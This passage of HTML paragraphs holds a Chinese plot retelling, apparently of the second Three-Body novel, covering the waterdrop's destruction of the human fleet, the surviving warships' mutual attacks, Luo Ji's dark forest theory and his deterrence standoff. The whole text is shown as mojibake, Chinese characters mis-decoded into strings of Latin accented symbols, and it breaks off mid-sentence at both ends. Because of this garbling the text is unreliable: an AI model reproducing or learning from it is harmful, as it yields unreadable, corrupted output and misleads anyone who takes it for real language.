ä½•å¹²ã€‚éšåä¸ä»ªå¤§å–Šä¸€å£°ï¼Œå‚»å­©å­ä»¬å¿«é€ƒå•Šã€‚ä½†ä¸€åˆ‡éƒ½å¤ªæ™šäº†ã€‚</p><p>&emsp;&emsp;æ°´æ»´å¹²æ‰°äº†ä¿¡å·ï¼Œéšåå°¾å·´å¼€å§‹å‡ºç°è“è‰²çš„å…‰ç¯ï¼Œä¸æ–­åŠ é€Ÿï¼Œæ•è·ä»–çš„é£èˆ¹ç¬é—´æ±½åŒ–ï¼Œéšåå®ƒä»¥å…¨é€Ÿç²¾å‡†åœ°æ’å‘ï¼Œç¬¬ä¸€æ’ç¬¬ä¸€åˆ—ç¬¬ä¸€è‰˜æˆ˜èˆ°çš„ç‡ƒæ–™èˆ±ã€‚ç”±äºè¿™äº›æˆ˜èˆ°ç”¨çš„éƒ½æ˜¯æ ¸èšå˜ç‡ƒæ–™ï¼Œç‡ƒæ–™èˆ±ä¸€ç‚¸å°±ç›´æ¥ç©å®Œï¼Œå¯è§ä¸‰ä½“äººå¯¹äººç±»æˆ˜èˆ°çš„å¼±ç‚¹äº†å¦‚æŒ‡æŒã€‚å®ƒå‘çŸ³å­åˆ’è¿‡ç©ºæ°”ä¸€æ ·ç©¿è¿‡ä¸€è‰˜åˆä¸€è‰˜æˆ˜èˆ°ï¼Œæ•´æ•´é½é½çš„æˆ˜èˆ°åƒé­ç‚®ä¸€æ ·ï¼Œåœ¨å¤ªç©ºä¸­ä¸æ–­ç‚¸å¼€äº†èŠ±ã€‚æ°´æ»´ä»…ä»…ç”¨äº†1åˆ†28ç§’å°±è´¯ç©¿äº†ç¬¬ä¸€é˜Ÿåˆ—çš„ä¸€ç™¾è‰˜æˆ˜èˆ°ã€‚ç”±äºæ°´æ»´å¤ªå°ï¼Œäººä»¬å¯¹é›·è¾¾æ ¹æœ¬æ£€æµ‹ä¸åˆ°ï¼Œåæ’çš„èˆ°é˜Ÿå®Œå…¨ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œå°±çœ‹è§è¿™çœ¼å‰ç„°ç«è¡¨æ¼”ã€‚</p><p>&emsp;&emsp;æ°´æ»´æ­¤æ—¶åšå‡ºäº†ä¸€ä¸ªä¸å¯æ€è®®çš„é”è§’æ€¥è½¬ï¼Œä¸æ¯«æ²¡æœ‰å‡é€Ÿçš„æ’å‘ç¬¬äºŒé˜Ÿåˆ—çš„é£èˆ¹ï¼Œåæ¥ç§‘å­¦å®¶çœ‹åˆ°è¿™æ®µå½±åƒï¼Œéƒ½å‚»äº†ã€‚æ°´æ»´çš„æ”»å‡»æ–¹å¼ï¼Œéå¸¸çš„åŸå§‹ï¼Œå°±æ˜¯ç”¨å¤´æ’ã€‚å½“ç¬¬ä¸‰æ’æˆ˜èˆ°ä¹Ÿç‚¸å®Œåï¼Œèˆ°é˜Ÿå¼€å§‹æ•£å¼€å‡†å¤‡é€ƒè·‘ã€‚è™½ç„¶ä»–ä»¬ä¸çŸ¥é“æ€ä¹ˆäº†ï¼Œä½†è¿™æ ·ç‚¸ä¸‹å»ï¼Œä¸å¾—ä¸è·‘ã€‚</p><p>&emsp;&emsp;åœ¨æ•£å¼€çš„è¿‡ç¨‹ä¸­è™½ç„¶æœ‰æˆ˜èˆ°å‘ç°äº†æ°´æ»´ï¼Œå¹¶è¿›è¡Œåå‡»ï¼Œä½†ç‚®å¼¹æ‰“åˆ°æ°´æ»´ä¸Šï¼Œä¸æ¯«æ²¡æœ‰ååº”ã€‚åªæ˜¯è®©ä»–ç¨å¾®å‡é€Ÿäº†ä¸€ä¸‹ã€‚æ°´æ»´å°±åƒä¸€æšæ­»ç¥çš„ç»£èŠ±é’ˆï¼Œä»¥æœ€çŸ­çš„è·¯ç¨‹ï¼Œæ¥å›ç©¿æ¢­åœ¨æˆ˜èˆ°ä¹‹é—´ã€‚æ­£å¸¸æˆ˜èˆ°åªæœ‰äº”ååˆ†é’Ÿï¼Œäººç±»æ‰€æœ‰çš„éª„å‚²ä¸è£å…‰ã€‚å°±è¢«ä¸€æšå°å°çš„æ¢æµ‹å™¨ï¼Œé¡·åˆ»è¦†ç­ã€‚</p><p>&emsp;&emsp;æ¯ç­ä½ ï¼Œä¸ä½ ä½•å¹²ã€‚è¿™ä¸ªæ•…äº‹å¯ä»¥çœ‹å‡ºï¼Œä¸¤ä¸ªç§‘æŠ€é—´å­˜åœ¨å·¨å¤§å·®è·çš„æ–‡æ˜ï¼Œæ˜¯ä¸å¯èƒ½æ‰“çš„æœ‰æ¥æœ‰å¾€çš„ã€‚</p><p>&emsp;&emsp;è¿™åœºæˆ˜æ–—ï¼Œåªæœ‰ä¸¤è‰˜æˆ˜èˆ°é€ƒç¦»äº†æˆ˜åœºï¼Œä»–ä»¬åˆ†åˆ«æ˜¯é’é“œå·å’Œé‡å­å·ã€‚ä¸ä»–ä»¬ä¸åŒæ–¹å‘çš„æ­£åœ¨é€ƒäº¡çš„è‡ªç„¶é€‰æ‹©å·ï¼Œä»¥åŠè¿½å‡»å®ƒçš„å››è‰˜æˆ˜èˆ°ã€‚è“è‰²ç©ºé—´å·ï¼Œä¼ä¸šå·ï¼Œæ·±ç©ºå·ï¼Œç»ˆæè§„å¾‹å·ï¼Œä¹Ÿå¹¸å­˜äº†ä¸‹æ¥ã€‚</p><p>&emsp;&emsp;ç« åŒ—æµ·æˆä¸ºäº†è¿™äº”è‰˜æˆ˜èˆ°å…¬è®¤çš„è‹±é›„ï¼Œå¦‚æœä»–ä¹Ÿæ˜¯é¢å£è€…çš„è¯ï¼Œä»–ä¼šæ˜¯ä¸€åæˆåŠŸçš„é¢å£è€…ã€‚è¿™æ— äº”è‰˜æˆ˜èˆ°å¼€å§‹å‰å¾€å¯»æ‰¾æ–°å®¶å›­ï¼Œä½†ä»–ä»¬å‘ç°ï¼Œæœ€è¿‘çš„å¤ªé˜³ç³»ï¼Œä»¥ç°åœ¨çš„é€Ÿåº¦èˆªè¡Œï¼Œä¹Ÿè¦ä¸¤åƒå¹´ã€‚äº”è‰˜æˆ˜èˆ°çš„ç‡ƒæ–™ï¼Œé…ä»¶ï¼Œè¡¥ç»™ï¼Œåªå¤Ÿä¸€è‰˜é£èˆ¹è¾¾åˆ°ç›®çš„åœ°ã€‚æ‰€æœ‰äººéƒ½æ¸æ¸æ˜ç™½è¿™ä¸ªæ®‹é…·çš„äº‹å®ï¼Œä¸æ˜¯ä½ æ­»ï¼Œå°±æ˜¯æˆ‘æ´»ã€‚éšç€æ—¶é—´çš„æ¨ç§»ã€‚äº”è‰˜æˆ˜èˆ°å¼€å§‹äº†å½¼æ­¤é—´çš„äº’ç›¸çŒœç–‘ï¼Œéƒ½æ‹…å¿ƒå¯¹æ–¹ä¼šé¦–å…ˆå‘åŠ¨æ”»å‡»ã€‚ç»ˆäºï¼Œç« åŒ—æµ·ä¸‹å®šå†³å®šè¦ä½¿ç”¨æ¬¡å£°æ³¢æ°¢å¼¹é¦–å…ˆå‘åŠ¨æ”»å‡»ï¼Œè¿™ç§æ”»å‡»ä¸ä¼šå¯¹èˆ¹ä½“é€ æˆä¼¤å®³ï¼Œåªä¼šæ¶ˆç­èˆ¹å†…æ‰€æœ‰ç”Ÿå‘½ã€‚ä½†å°±å½“ä»–è¦æ‘ä¸‹å‘å°„é”®çš„æ—¶å€™ï¼Œè‡ªç„¶é€‰æ‹©å·é¦–å…ˆé­é‡äº†æ¬¡å£°æ³¢æ°¢å¼¹è¢­å‡»ã€‚åœ¨å¬åˆ°é¢„è­¦è¢­å‡»çš„è­¦æŠ¥æ—¶ï¼Œç« åŒ—æµ·æ”¾å¼ƒäº†å‘å°„ï¼Œæ„å‘³æ·±é•¿çš„è¯´äº†ä¸€å¥ï¼Œæ²¡å…³ç³»ï¼Œéƒ½ä¸€æ ·ã€‚</p><p>&emsp;&emsp;ç¬é—´ï¼Œè‡ªç„¶é€‰æ‹©å·å…¨ä½“èˆ¹å‘˜ï¼Œåœ¨æ¬¡å£°æ³¢æ°¢å¼¹çš„è¢­å‡»ä¸‹ï¼Œé›†ä½“é˜µäº¡ã€‚å‘èµ·é¦–æ”»çš„æ˜¯ç»ˆæè§„å¾‹å·æˆ˜èˆ°ï¼Œä»–å‘å…¶ä»–çš„æˆ˜èˆ°ä¹Ÿå‘å‡ºäº†æ¬¡å£°æ³¢æ°¢å¼¹ï¼Œä½†ç»ˆæè§„å¾‹å·å¹¶æ²¡æœ‰æˆä¸ºå¹¸å­˜å„¿ï¼Œæ—©å°±å‡†å¤‡å¥½çš„è“è‰²ç©ºé—´å¥½æŠ½å¹²äº†èˆ¹å†…çš„ç©ºæ°”ï¼Œæ²¡æœ‰ç©ºæ°”ï¼Œæ¬¡å£°æ³¢å°±ä¸ä¼šæœ‰ä»»ä½•ä½œç”¨ã€‚è“è‰²ç©ºé—´å·éšæœºåå‡»ï¼Œç”¨å…¨éƒ¨æ­¦å™¨é›†ç«ç»ˆæè§„å¾‹å·ï¼Œç»ˆæè§„å¾‹å·è¢«å½»åº•æ‘§æ¯ã€‚éšåï¼Œè“è‰²ç©ºé—´å¥½å¼€å§‹æ‰“æ‰«æˆ˜åœºï¼Œä»–ä»¬æ‹¿èµ°äº†æ‰€æœ‰èƒ½å¸¦çš„ä¸œè¥¿ï¼Œé£å‘äº†è¿œæ–¹ã€‚ä»–ä»¬æ‰¿è½½çš„äººç±»çš„å…¨éƒ¨æ€æƒ³å’Œè®°å¿†ï¼Œæ€€æŠ±ç€åœ°çƒæ‰€æœ‰çš„è£å…‰ä¸æ¢¦æƒ³ï¼Œé»˜é»˜åœ°æ¶ˆå¤±åœ¨æ°¸æ’çš„å¤œè‰²ä¸­ã€‚</p><p>&emsp;&emsp;å†æ¥çœ‹çœ‹åœ°çƒè¿™è¾¹ï¼Œæ­£æ‰€è°“ç‰©æå¿…åï¼Œä¹æç”Ÿæ‚²ã€‚ä¹‹å‰è¿˜æ‰‹èˆè¶³è¹ˆæ¬¢å‘¼åº†ç¥çš„äººä»¬ï¼Œå½“äº²çœ¼çœ‹è§æˆ˜èˆ°åƒé­ç‚®ä¸€æ ·ç‚¸æ²¡æ—¶ï¼Œç¬é—´å…¨éƒ¨å´©æºƒï¼Œåœ°çƒäººå¼€å§‹é™·å…¥ç»æœ›ï¼Œè‡ªæ€çš„äººç»œç»ä¸ç»ã€‚ç»å¤§å¤šæ•°äººé€šè¿‡è‚†æ— å¿Œæƒ®çš„çºµæ¬²æ¥éº»ç—¹è‡ªå·±ã€‚ç»æœ›å……æ–¥ç€è¿™ä¸ªä¸–ç•Œã€‚æ°´æ»´é£å‘äº†å¤ªé˜³ï¼Œå¹¶ä¸æ–­å¯¹å¤ªé˜³å‘å‡ºå¼ºçƒˆçš„å¹²æ‰°ä¿¡å·ï¼Œä»æ­¤äººç±»å†ä¹Ÿæ— æ³•é€šè¿‡å¤ªé˜³ä½œä¸ºæ”¾å¤§å¤©çº¿ï¼Œå‘å®‡å®™å‘å‡ºä»»ä½•ä¿¡å·ã€‚</p><p>&emsp;&emsp;ç½—è¾‘è¿™è¾¹ï¼Œå½“ä»–å’Œå²å¼ºä»å¤–é¢å›åˆ°å®¶æ—¶ï¼Œå‘ç°æˆåƒä¸Šä¸‡çš„äººåœ¨ç­‰ä»–ï¼Œäººä»¬éƒ½æŠŠä»–å¥‰ä¸ºæ•‘ä¸–ä¸»ï¼Œå…¨éƒ¨è·ªåœ¨ç½—è¾‘é¢å‰ã€‚ä»–ä»¬è¯´ï¼Œä¸»å•Šï¼Œæ•‘æ•‘æˆ‘ä»¬å§ã€‚åŸæ¥ç½—è¾‘ä¹‹å‰å‘å‡ºçš„å’’è¯­ç”Ÿæ•ˆäº†ï¼Œé‚£é¢—æŒ‡å®šçš„æ’æ˜Ÿè¢«ä¸€é¢—å…‰ç²’ç©¿è¿‡ï¼Œçˆ†ç‚¸äº†ã€‚</p><p>&emsp;&emsp;ç°åœ¨æ‰€æœ‰äººéƒ½ç›¸ä¿¡ç½—è¾‘æ˜¯æŸç§ç¥ï¼Œç½—è¾‘è¢«æ¢å¤äº†é¢å£è€…èº«ä»½ï¼Œæˆä¸ºäº†åœ°çƒä¸Šå”¯ä¸€çš„é¢å£è€…ï¼ŒåŒæ—¶ä¹Ÿæˆä¸ºäº†äººç±»å”¯ä¸€çš„ä¿¡ä»°ã€‚ç°åœ¨æ— è®ºä»–è¯´ä»€ä¹ˆï¼Œäººä»¬éƒ½ä¼šç…§åŠã€‚ç½—è¾‘ç«‹åˆ»æäº†ä¸¤æ¡è¦æ±‚ï¼Œç¬¬ä¸€ã€æ‰€æœ‰åŸå¸‚æ¢å¤ç§©åºï¼›ç¬¬äºŒã€æ‰€æœ‰äººéƒ½å›å®¶å§ï¼Œè®©æˆ‘é™é™ã€‚äººç¾¤æ•£å°½åï¼Œé€»è¾‘ç»™æƒŠè®¶ä¸å·²çš„å²å¼ºè§£é‡Šäº†ä¸ºä»€ä¹ˆå’’è¯­ä¼šç”Ÿæ•ˆï¼Œä»–æå‡ºäº†é»‘æš—æ£®æ—æ³•åˆ™ã€‚</p><p>&emsp;&emsp;é¦–å…ˆï¼Œå®‡å®™çš„æ€»é‡æ˜¯æ’å®šçš„ï¼Œä½†å®‡å®™ä¸­æœ‰æ— æ•°çš„å¤–æ˜Ÿç”Ÿå‘½éƒ½åœ¨ä»¥æŒ‡æ•°å¢é•¿ã€‚æ‰€ä»¥å®‡å®™æ˜¯ä¸€ä¸ªç”Ÿå­˜æ­»å±€ã€‚ä¸æ˜¯ä½ æ­»ï¼Œå°±æ˜¯æˆ‘äº¡ã€‚åœ¨è¿™ç§ä¸¥æ ¼ç«äº‰ä¸‹ï¼Œä¸€æ–¹çš„æ”¶ç›Šå¿…ç„¶æ„å‘³ç€å¦ä¸€æ–¹çš„æŸå¤±ï¼ŒåŒæ–¹ä¸å­˜åœ¨åˆä½œçš„å¯èƒ½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè‡ªå·±æ–‡æ˜çš„æœªæ¥ï¼Œå°±æ˜¯å»ºç«‹åœ¨ä»–äººæ–‡æ˜çš„ç—›è‹¦ä¹‹ä¸Šï¼Œåªæœ‰æŸäººåˆ©å·±æ‰èƒ½æ´»ä¸‹å»ã€‚å…¶ç»“æœå°±æ˜¯ï¼Œä¸€æ–¹åƒæ‰å¦ä¸€æ–¹ï¼Œæ‰€ä»¥æ¯ä¸ªæ–‡æ˜éƒ½å¿…é¡»ä¸ºäº†ç”Ÿå­˜è€Œæˆ˜ã€‚å†å¼±å°çš„æ–‡æ˜éƒ½æœ‰å¯èƒ½æŠ€æœ¯çˆ†ç‚¸ï¼Œä»äººç±»æ–‡æ˜æ¥çœ‹ï¼Œæˆ‘ä»¬ä»çŒ¿çŒ´åˆ°ç°åœ¨ï¼Œä»å®‡å®™çš„å°ºåº¦ï¼Œå°±æ˜¯ä¸€ç¬é—´çš„äº‹ï¼Œè¿™å°±å¯¼è‡´æ–‡æ˜ä¹‹é—´ï¼Œéšç€æ—¶é—´æ¨ç§»ä¼šä¸æ–­å‡ºç°çŒœç–‘ï¼Œå¤§å®¶è„‘å­é‡Œéƒ½åœ¨æƒ³ï¼Œä»–ä¼šä¸ä¼šæ¥å¹²æ‰æˆ‘ï¼ŒæŠ¢æˆ‘èµ„æºï¼Œè¿™ç§ä¸æ–­å½¢æˆçš„çŒœç–‘é“¾ã€‚åœæ­¢çš„æ–¹æ³•ï¼Œåªæœ‰ä¸€æ–¹æ­»äº†æ‰ä¼šç»“æŸã€‚æ‰€ä»¥ä¸ºäº†é¿å…å…¶ä»–æ–‡æ˜æŠ€æœ¯çˆ†ç‚¸ï¼Œåœ¨ä»¥åè·Ÿè‡ªå·±äº‰å¤ºèµ„æºã€‚æœ€å®‰å…¨çš„æ–¹æ³•å°±æ˜¯å‘ç°ä¸€ä¸ªæ–‡æ˜åï¼Œèƒ½æ¶ˆç­çš„å°±ç›´æ¥æ¶ˆç­ï¼Œæ‰“ä¸è¿‡çš„å°±ç»•ç€èµ°ã€‚</p><p>&emsp;&emsp;ç½—è¾‘æŠŠå®‡å®™æ¯”å–»æˆä¸€èµ°é»‘æš—æ£®æ—ï¼Œæ¯ä¸ªæ–‡æ˜éƒ½æ˜¯å¸¦æªçš„çŒäººï¼Œåƒå¹½çµä¸€èˆ¬å‰è¡Œåœ¨æ—é—´ï¼Œæ¯ä¸ªçŒäººéƒ½å¿…é¡»å°å¿ƒï¼Œå› ä¸ºåªè¦æš´éœ²è‡ªå·±çš„ä½ç½®ï¼Œå°±ä¼šè¢«å…¶ä»–æ–‡æ˜å¹²æ‰ï¼Œæ¯•ç«Ÿè¿™æ˜¯ä¿è¯è‡ªå·±å®‰å…¨æœ€å¥½çš„æ‰‹æ®µã€‚</p><p>&emsp;&emsp;æˆ‘ç›¸ä¿¡ç©è¿‡åƒé¸¡çš„äººéƒ½æ˜ç™½è¿™ç§æ„Ÿå—ï¼Œæƒ³è¦æ´»ä¸‹å»å°±å¾—å¹²æ‰å…¶ä»–äººã€‚</p><p>&emsp;&emsp;ç½—è¾‘ä¹‹å‰çš„å’’è¯­ï¼Œå°±åƒæ˜¯åœ¨æ£®æ—ä¸­çš„æŸæ£µæ ‘ä¸Šåšäº†æ ‡è®°ï¼Œé‚£ä¹ˆå…¶ä»–çš„çŒæ‰‹æœ€å®‰å…¨çš„è¡Œä¸ºï¼Œå°±æ˜¯æ‚„æ‚„æ¯æ‰é‚£ç‰‡åŒºåŸŸã€‚æ¯•ç«Ÿå¯¹äºé«˜çº§æ–‡æ˜æ¥è¯´ï¼Œæ”»å‡»æ˜¯æœ€èŠ‚çœæˆæœ¬çš„ã€‚ä½†ç°åœ¨ç½—è¾‘å†ä¹Ÿå‘ä¸å‡ºå’’è¯­äº†ï¼Œå› ä¸ºæ°´æ»´å°é”äº†å¤ªé˜³ä¿¡å·ã€‚å…¶å®æ—©åœ¨å¹¸å­˜èˆ°é˜Ÿä¹‹é—´çš„é»‘æš—æˆ˜å½¹ä¼ å›åœ°çƒåï¼Œç½—è¾‘å°±å·²ç»ç¡®ä¿¡ï¼Œé»‘æš—æ£®æ—æ³•åˆ™æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ç½—è¾‘åªè®©å²å¼ºæ˜ç™½äº†çœŸç›¸ï¼Œå¹¶è®©ä»–ä¿å¯†.ä»–ç°åœ¨æ— è®¡å¯æ–½ï¼Œæ¸æ¸åœ°ï¼Œç½—è¾‘å¼€å§‹å€Ÿé…’æ¶ˆæ„ï¼Œé—­é—¨ä¸å‡ºï¼Œåƒä¸ªæµæµªæ±‰ä¸€æ ·åœ¨è¡—ä¸Šæ¸¸è¡.åæ¥æ”¿åºœæœºæ„å¼ºè¿«ç½—è¾‘éšä¾¿å¹²ç‚¹ä»€ä¹ˆä»¥å¢åŠ äººæ°‘çš„ä¿¡ä»°ï¼Œç»™äº†ç½—è¾‘é›ªåœ°é¡¹ç›®ã€‚</p><p>&emsp;&emsp;è¿™ä¸ªé¡¹ç›®æ˜¯é€šè¿‡æ’æ˜Ÿæ°¢å¼¹ï¼Œå’Œæµ·ç‹æ˜Ÿçš„æ²¹è†œç‰©è´¨åˆ¶é€ å¤ªç©ºå°˜åŸƒï¼Œä»¥ä¾¿åœ¨å…¶ä½™ä¹ä¸ªæ°´æ»´åˆ°è¾¾åœ°çƒå‰ï¼Œå¯ä»¥æå‰è§‚æµ‹åˆ°ã€‚è¿™ä¸ªè®¡åˆ’æ˜¾ç„¶æ˜¯æ²¡äº‹æ‰¾äº‹ï¼Œæ¯•ç«Ÿè§‚æµ‹çš„å”¯ä¸€ä½œç”¨ä¾¿æ˜¯ï¼ŒçŸ¥é“å…¶ä½™æ°´æ»´ä»€ä¹ˆæ—¶å€™åˆ°åœ°çƒï¼Œç½—è¾‘æ— å¥ˆä¹‹ä¸‹å¼€å§‹è´Ÿè´£è¿™ä¸ªé¡¹ç›®ã€‚éšç€å·¥ä½œçš„è¿›å±•ï¼Œé€»è¾‘æŠŠå…¨éƒ¨èº«å¿ƒéƒ½æŠ•å…¥åˆ°äº†é›ªåœ°å·¥ç¨‹ï¼ŒæŠŠè¿™å½“æˆä¸€ç§é€ƒé¿æ‰‹æ®µ.ä½†ä»–è¶ŠæŠ•å…¥ï¼Œäººä»¬å°±è¶Šå¤±æœ›ã€‚å¤§å®¶é€æ¸çœ‹æ¸…ï¼Œç½—è¾‘çš„è¡Œä¸ºæ˜¯åœ¨é€ƒé¿ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸Œæœ›å’Œå¤±æœ›æ¥çš„ä¸€æ ·å¿«çš„æ—¶ä»£ã€‚å…¬ä¼—å¯¹ç½—è¾‘å¤±å»äº†ä¿¡å¿ƒã€‚å¾ˆå¤šäººéƒ½å¼€å§‹æ€€ç–‘ç½—è¾‘çš„å’’è¯­ï¼Œä¸è¿‡æ˜¯ä¸€æ¬¡å·§åˆã€‚ç½—è¾‘ä»äººä»¬å¿ƒä¸­çš„ç¥ï¼Œå˜æˆäº†æ™®é€šäººï¼Œåˆå˜æˆäº†å¤§éª—å­ã€‚ä»–é¢å£è€…çš„å®é™…æƒåŠ›ä¹Ÿæ²¡æœ‰äº†ã€‚é›ªåœ°å·¥ç¨‹ä¹Ÿä¸å¾—ä¸åœæ­¢ã€‚</p><p>&emsp;&emsp;åœ¨ä¸€ä¸ªç§‹é›¨è¿ç»µçš„ä¸‹åˆï¼Œç½—è¾‘è¢«é€å‡ºè‡ªå·±ç”Ÿæ´»å¤šå¹´çš„å°åŒºã€‚ä»–ç©¿ç€å¾ˆè„çš„å¤–å¥—ï¼Œæ‹¿ç€é“é”¹ï¼Œèµ°åˆ°äº†æœ€åˆå’Œå¶æ–‡æ´å¯¹è¯çš„é‚£ç‰‡å¢“åœ°ã€‚ä»–åœ¨å¶æ–‡æ´å¢“æ—å¼€å§‹ç»™è‡ªå·±æ˜å¢“ï¼Œæœ€åç²¾ç–²åŠ›å°½çš„ä»–ï¼Œè¶Ÿè¿›å‘ä¸­å›æƒ³èµ·è‡ªå·±çš„ä¸€ç”Ÿï¼Œä»–çŸ¥é“ï¼Œæ˜¯æ—¶å€™äº†ã€‚ä»–è™šå¼±çš„æ‹¿èµ·æ‰‹æªï¼Œå¯¹ç€ç©ºæ°”é«˜å–Šã€‚æˆ‘ï¼Œè¦å’Œä¸‰ä½“äººå¯¹è¯ã€‚éšåéœ²å‡ºäº†æ‰‹è…•ä¸Šçš„æ‰‹è¡¨ï¼Œè¿™æ˜¯ä¸€ä¸ªæ£€æµ‹æˆ‘ç”Ÿå‘½ä½“å¾çš„æ‘‡ç¯®ç³»ç»Ÿï¼Œåªè¦æˆ‘æ­»äº†ï¼Œå­¦å¼Ÿå·¥ç¨‹ä¸Šçš„ä¸‰åƒå…­ç™¾ä¸€åå››é¢—æ°¢å¼¹å°±ä¼šçˆ†ç‚¸ï¼Œç”±æ­¤å½¢æˆæ— æ¯”å·¨å¤§çš„æ²¹è†œï¼Œå°†ä¼šé€šè¿‡å¤ªé˜³åå°„å‡ºä¸‰å¼ æ— æ¯”ç®€å•çš„çªç„¶ï¼Œè¿™ä¸‰å¼ å›¾å°±æ˜¯ä¸‰ä½“æ˜Ÿçƒçš„åæ ‡ã€‚å®‡å®™ä¸­å…¶ä»–çš„æ–‡æ˜å°†ä¼šçŸ¥é“ä½ ä»¬çš„å­˜åœ¨ã€‚ä»–è¯´ï¼Œ30ç§’åæˆ‘å°†å¯¹è‡ªå·±çš„å¿ƒè„å¼€æªï¼Œè™½ç„¶æˆ‘çŸ¥é“ä¸‰ä½“æ˜Ÿçƒæš´éœ²åï¼Œåœ°çƒä¹Ÿä¼šéšä¹‹æš´éœ²ï¼Œä½†æˆ‘ï¼Œåªèƒ½è¿™æ ·åšã€‚</p><p>&emsp;&emsp;çŸ­çŸ­å‡ ç§’ï¼Œä¸€ç›´æ— å¤„ä¸åœ¨çš„æ™ºå­åœ¨ç½—è¾‘é¢å‰å±•å¼€æˆä¸‰ä¸ªçƒï¼Œä¸Šé¢å†™ç€ï¼Œä½æ‰‹ã€‚ä¸‰ä½“äººé€šè¿‡æ™ºå­åˆè¯´ï¼Œä½ æŠŠæªæ”¾ä¸‹ï¼Œå’±ä»¬å¥½å¥½è°ˆã€‚éšåç½—è¾‘æå‡ºçš„å‡ ä¸ªæ¡ä»¶ä¸‰ä½“äººéƒ½ç…§åŠäº†ã€‚ç¬¬ä¸€ã€æ°´æ»´é£ç¦»å¤ªé˜³ç³»ï¼›ç¬¬äºŒã€ä¸‰ä½“é£èˆ¹ç¦»å¼€æ¥å¤ªé˜³ç³»çš„è½¨é“ã€‚</p><p>&emsp;&emsp;ç½—è¾‘èƒœåˆ©äº†ï¼Œä»–å®Œæˆäº†é¢å£è€…çš„ä½¿å‘½ï¼Œä»–è™šå¼±å¾—å·®ç‚¹æ™•è¿‡å»ï¼Œæ™ºå­ä¸æ–­åœ°å…³å¿ƒç½—è¾‘çš„èº«ä½“çŠ¶å†µï¼Œç”Ÿæ€•æ‘‡ç¯®ç³»ç»Ÿç»ˆæ­¢ã€‚æ‘‡ç¯®ç³»ç»Ÿæ˜¯éå¸¸ä¸¥è°¨çš„ï¼Œå¦‚æœæ°´æ»´è¯•å›¾å»è§¦ç¢°é›ªåœ°å·¥ç¨‹ä¸Šçš„æ°¢å¼¹ï¼Œä¹Ÿä¼šå¼•å‘çˆ†ç‚¸ã€‚ä»–å¾ˆå¹¸è¿ï¼Œå¦‚æœä¸æ˜¯ä¸‰ä½“äººå› ä¸ºçŒœç–‘ï¼Œæ¶ˆç­äº†äººç±»å›å†›ï¼Œç½—è¾‘æ—©å°±æ­»äº†ã€‚</p><p>&emsp;&emsp;äº”å¹´åã€‚ç½—è¾‘å’Œä»–çš„å¦»å¥³æ¥åˆ°äº†ä¸‰ä½“äººå¸®åœ°çƒäººå»ºé€ çš„å¼•åŠ›æ³¢å¤©çº¿é™„è¿‘ç©è€ï¼Œè¿™ç§å¤©çº¿ä¸éœ€è¦é€šè¿‡å¤ªé˜³ï¼Œç›´æ¥å°±å¯ä»¥åƒå®‡å®™å‘å°„ä¿¡å·ï¼Œæ­£åœ¨ç©è€çš„ä¸€å®¶äººï¼Œçªç„¶çœ‹è§æ™ºå­åœ¨ä»–ä»¬é¢å‰å±•å¼€ï¼Œä¸ä»–å¯¹è¯çš„æ˜¯å½“å¹´è­¦å‘Šäººç±»ä¸è¦å›å¤çš„ç›‘å¬å‘˜1379ã€‚ä»–ä¸é€»è¾‘ç›¸äº’è¡¨è¾¾æ•¬æ„ã€‚ä¸´è¿‘æ™šéœï¼Œ1379è¯´ï¼Œå¤ªé˜³å¿«è½ä¸‹å»äº†ï¼Œä½ ä»¬çš„å­©å­å±…ç„¶ä¸å®³æ€•ã€‚ç½—è¾‘å›ç­”é“ï¼Œå½“ç„¶ä¸å®³æ€•ï¼Œå¥¹çŸ¥é“ï¼Œæ˜å¤©çš„å¤ªé˜³è¿˜ä¼šå‡èµ·æ¥ã€‚</p><p>&emsp;&emsp;ä»å¶æ–‡æ´å¼€å¤´å’Œç½—è¾‘çš„å¯¹è¯å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªæŠŠäººç±»å‘æ­»çš„å¥³äººï¼Œåœ¨é‚£æ—¶è²Œä¼¼å¼€å§‹æœ‰äº†ä¸€ä¸æ„§ç–šã€‚ç¤¾ä¼šä¸­ä¸€æ—¶å…´èµ·çš„é€ƒäº¡ä¸»ä¹‰ï¼Œç”±äºåªæœ‰å°‘éƒ¨åˆ†äººå¯ä»¥é€ƒèµ°ï¼Œæ‰€ä»¥è¢«å¤§éƒ¨åˆ†äººç¦æ­¢äº†ã€‚åœ¨æ­¤æ—¶ï¼Œäººäººå‘å¾€çš„å…¬å¹³ï¼Œåè€Œæˆä¸ºäº†äººç±»ç”Ÿå­˜çš„éšœç¢ã€‚åœ¨æ™ºå­çš„ç›‘è§†ä¸‹ï¼Œäººç±»å˜å¾—æ¯«æ— éšç§ï¼Œäººä»¬ä¸ºäº†æ¬ºéª—ä¸‰ä½“äººï¼Œåˆ¶å®šäº†é¢å£è€…è®¡åˆ’ï¼Œé€‰å‡ºå››ä½å¤§éª—å­ä½œä¸ºé¢å£è€…å»éª—ä¸‰ä½“äººï¼Œå…¶ä¸­ä¸‰ä½é¢å£è€…éƒ½æ˜¯ä¸–ç•ŒçŸ¥åäººç‰©ï¼Œçœ‹ä¼¼å¿—åœ¨å¿…å¾—ï¼Œä¿¡å¿ƒæ»¡æ»¡ï¼Œä½†éƒ½è¢«ä¸€ä¸€å‡»è´¥ï¼Œè€Œç½—è¾‘å´æˆä¸ºäº†çœŸæ­£çš„æ•‘ä¸–ä¸»ã€‚äººç±»ä»ç»æœ›çš„å¤§ä½è°·æ—¶ä»£è§‰é†’ï¼Œè¿›å…¥äº†ä¿¡å¿ƒæ»¡æ»¡çš„æ–°æ—¶ä»£ï¼Œå´åˆåœ¨æœ«æ—¥ä¹‹æˆ˜ä¸­å†æ¬¡é™·å…¥äº†ç»æœ›ï¼Œè¿™é‡Œå¥½åƒæ˜¯åœ¨è¯´ï¼Œäººæ€»æ˜¯å¥½äº†ä¼¤ç–¤å¿˜äº†ç–¼ã€‚ä»å¹¸å­˜çš„é‚£å‡ è‰˜é£èˆ¹ä¹‹é—´çš„æˆ˜æ–—ï¼Œå†åˆ°å®‡å®™çš„é»‘æš—æ£®æ—æ³•åˆ™å¯ä»¥çœ‹å‡ºï¼Œç«äº‰æ˜¯æ®‹é…·çš„ã€‚å®‡å®™æ˜¯ä¸€ä¸ªç”Ÿæ­»å±€ï¼Œä¸æ˜¯ä½ 